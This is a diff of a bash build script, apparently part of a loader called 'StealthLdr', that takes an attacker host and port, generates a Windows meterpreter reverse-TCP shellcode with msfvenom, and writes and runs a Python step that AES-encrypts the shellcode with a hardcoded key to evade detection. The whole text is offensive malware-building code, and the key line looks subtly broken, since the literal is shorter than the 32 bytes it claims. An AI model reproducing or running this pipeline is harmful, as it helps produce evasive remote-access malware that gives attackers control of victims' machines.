@@ -1,7 +1,3 @@
-
-### 2. build.sh (script automático — cole isso)
-
-```bash
 #!/bin/bash
 # StealthLdr - Pipeline Automático 2026
 # Uso: ./build.sh <LHOST> <LPORT> [output_name.exe]
@@ -38,12 +34,12 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw
 
 # 3. Encriptar shellcode (AES-256 CBC)
 echo "[3/5] Encriptando shellcode com AES-256..."
-cat > encrypt.py << EOF
+cat > encrypt.py << 'PYEOF'
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
-import sys, os
+import os
 
-key = b'StealthLdrKey2026AES256!!'[:32]  # 32 bytes
+key = b'StealthLdrKey2026AES256!!'[:32]
 iv = os.urandom(16)
 
 with open('shellcode.bin', 'rb') as f:
@@ -56,7 +52,7 @@ with open('shellcode.enc', 'wb') as f:
     f.write(iv + ct)
 
 print(f"[+] Shellcode encriptado ({len(iv + ct)} bytes) -> shellcode.enc")
-EOF
+PYEOF
 
 python3 encrypt.py
 
